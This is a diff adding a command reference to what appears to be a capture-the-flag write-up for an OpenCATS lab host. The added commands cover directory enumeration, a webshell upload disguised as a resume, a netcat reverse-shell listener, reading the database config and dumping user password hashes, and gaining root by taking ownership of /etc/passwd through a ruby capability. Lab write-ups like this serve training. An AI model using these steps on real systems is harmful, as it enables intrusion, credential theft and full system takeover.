@@ -206,8 +206,40 @@ sudo getcap -r / 2>/dev/null
 
 Monitor filesystem/integrity and alert on unexpected ownership/content changes.
 
+Commands Reference:
 
+```
+# directory enumeration
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://job.empline.thm -t 50
 
+# example PHP webshell (change IP/PORT)
+# upload via web form as resume.php or bypass naming checks
+
+# listener
+nc -nvlp 4444
+
+# inspect config
+cat /var/www/opencats/config.php
+
+# mysql
+mysql -u james -p -h localhost opencats
+
+# dump users
+SELECT user_name,email,password,access_level FROM user;
+
+# check capabilities
+getcap -r / 2>/dev/null
+
+# use ruby to chown /etc/passwd (lab only)
+sudo /usr/local/bin/ruby -e 'File.chown(1002,1002,"/etc/passwd")'
+
+# create password hash
+openssl passwd mynewpass
+
+# become root after editing /etc/passwd (lab only)
+su root
+
+```
 
 
 
